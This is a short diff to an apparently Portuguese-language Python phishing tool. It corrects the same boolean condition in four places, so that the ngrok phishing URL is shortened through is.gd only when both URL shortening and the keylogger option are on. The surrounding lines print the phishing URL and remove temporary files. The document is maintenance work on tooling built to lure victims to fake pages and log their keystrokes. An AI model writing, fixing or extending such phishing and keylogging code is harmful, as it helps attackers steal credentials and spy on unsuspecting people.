@@ -265,7 +265,7 @@ exit();''' %url_action)
          print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
          url_ngrok.close()
          os.popen("rm curl.txt > /dev/null 2>&1")
-         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
+         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
@@ -421,7 +421,7 @@ exit();''' %url_action)
          print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
          url_ngrok.close()
          os.popen("rm curl.txt > /dev/null 2>&1")
-         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
+         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
@@ -587,7 +587,7 @@ include 'ip.php';
          print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
          url_ngrok.close()
          os.popen("rm curl.txt > /dev/null 2>&1")
-         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
+         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
@@ -747,7 +747,7 @@ include 'ip.php';
          print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G + "%s" %ler_url_ngrok)
          url_ngrok.close()
          os.popen("rm curl.txt > /dev/null 2>&1")
-         if (encurtar_url == "on" or encurtar_url == "ON" and keylogger == "on" or keylogger == "ON"):
+         if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
            print ("\n" + W + "[" + G + "+" + W + "]" + C + " Encurtando URL %s..." %ler_url_ngrok)
            server = requests.post("https://is.gd/create.php?format=simple&url=%s" %ler_url_ngrok)
            if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
